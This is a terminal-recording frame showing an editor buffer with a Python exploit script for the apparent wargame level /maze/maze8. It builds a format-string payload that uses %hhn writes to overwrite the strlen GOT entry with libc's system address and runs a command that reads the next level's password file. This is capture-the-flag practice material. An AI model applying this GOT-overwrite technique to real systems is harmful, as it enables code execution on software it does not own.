[15.888319, "o", "\u001b[1;1H\u001b[35mimport\u001b[m socket, subprocess, time, struct, sys\u001b[2;1H\u001b[K\u001b[3;1HGOT_STRLEN = \u001b[31m0x0804b288\u001b[m\u001b[3;24H\u001b[K\u001b[4;1HSYSTEM = \u001b[31m0xf7d6d000\u001b[m + \u001b[31m0x53ce0\u001b[m\u001b[8C\u001b[34m# libc base (ASLR off) + system offset\u001b[m\r\r\nCMD = \u001b[31mb\"\u001b[m\u001b[35m\\n\u001b[m\u001b[31mcat /etc/maze_pass/maze9 > /tmp/o9 2>&1;\u001b[m\u001b[35m\\n\u001b[m\u001b[31m\"\u001b[m\r\r\n\r\r\n\u001b[33mdef\u001b[m \u001b[36mbuild_payload\u001b[m(target):\r\r\n    b = [(target >> (\u001b[31m8\u001b[m*i)) & \u001b[31m0xff\u001b[m \u001b[33mfor\u001b[m i \u001b[33min\u001b[m \u001b[36mrange\u001b[m(\u001b[31m4\u001b[m)]\r\r\n    cur = \u001b[36mlen\u001b[m(CMD)\u001b[19C\u001b[34m# the printed-char total includes the text\u001b[m\r\r\n    seq = []\r\r\n    remaining = \u001b[36mlist\u001b[m(\u001b[36menumerate\u001b[m(b))\r\r\n    \u001b[33mwhile\u001b[m remaining:\u001b[13;9Hbest = \u001b[36mmin\u001b[m(remaining, key=\u001b[33mlambda\u001b[m w: (w[\u001b[31m1\u001b[m]-cur) % \u001b[31m256\u001b[m)\u001b[14;9Hseq.append((best[\u001b[31m1\u001b[m], GOT_STRLEN+best[\u001b[31m0\u001b[m], (best[\u001b[31m1\u001b[m]-cur) % \u001b[31m256\u001b[m))\u001b[15;9Hcur = best[\u001b[31m1\u001b[m]\u001b[16;9Hremaining.remove(best)\r\r\n    fmt = CMD\r\r\n    offs = []\r\r\n    off = \u001b[31m152\u001b[m\u001b[24C\u001b[34m# pointer slots start here (4-aligned)\u001b[m\r\r\n    \u001b[33mfor\u001b[m byte, addr, delta \u001b[33min\u001b[m seq:\u001b[21;9Hk = \u001b[31m134\u001b[m + off // \u001b[31m4\u001b[m\u001b[11C\u001b[34m# vararg N for buf offset o: N = 134 + o/4\u001b[m\u001b[22;9Hfmt += (\u001b[31mb\"%\"\u001b[m + \u001b[36mstr\u001b[m(delta).encode() + \u001b[31mb\"c\"\u001b[m \u001b[33mif\u001b[m delta \u001b[33melse\u001b[m \u001b[31mb\"%c\"\u001b[m)\u001b[23;9Hfmt += \u001b[31mb\"%\"\u001b[m + \u001b[36mstr\u001b[m(k).encode() + \u001b[31mb\"$hhn\"\u001b[m\u001b[24;9Hoffs.append((off, addr))\u001b[25;9Hoff += \u001b[31m4\u001b[m\r\r\n    p = fmt + \u001b[31mb\"\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m\"\u001b[m\r\r\n    \u001b[33mfor\u001b[m o, addr \u001b[33min\u001b[m offs:\u001b[28;9Hp = p.ljust(o, \u001b[31mb\"\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m\"\u001b[m) + struct.pack(\u001b[31m\"<I\"\u001b[m, addr)\r\r\n    \u001b[33massert\u001b[m \u001b[36mlen\u001b[m(p) <= \u001b[31m511\u001b[m\r\r\n    \u001b[33mreturn\u001b[m p\r\r\n\r\r\nsubprocess.Popen([\u001b[31m\"/maze/maze8\"\u001b[m, \u001b[31m\"31337\"\u001b[m],\u001b[33;18Hstdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\u001b[34;93H1,1\u001b[11CTop\u001b[1;1H\u001b[?25h\u001b[?4m"]
